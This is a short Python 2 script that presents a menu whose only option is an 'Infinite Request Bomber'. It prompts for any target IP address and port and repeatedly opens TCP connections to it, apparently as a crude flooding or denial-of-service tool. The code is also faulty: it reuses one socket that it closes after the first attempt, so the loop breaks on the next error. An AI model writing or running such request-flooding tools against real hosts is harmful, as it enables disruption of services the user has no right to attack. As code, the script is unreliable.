import socket
import os
import requests

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def infrequestbomber():
	target = raw_input("Enter the IP Address of your target: ")
	port = int(raw_input("Enter the port you wish to connect on: "))
	
	while True:
		try:
			s.connect((target,port))
			msg = s.recv(1024)
			#sleep
			print msg
			
		except KeyboardInterrupt:
			print 'Exiting...'
			exit(0)
		except socket.error:
			print "No connection could be made, because the server actively refused it."
			break
		finally:
			s.close()
			
		
	
	


def main():
	
	opt_list = [infrequestbomber]
	print '==============='
	print "Menu Selection"
	print '==============='
	print ''
	print '1:Infinite Request Bomber'
	opt_choice = int(raw_input("Selection: "))
	opt_choice -= 1
	opt_list[opt_choice]()


main()
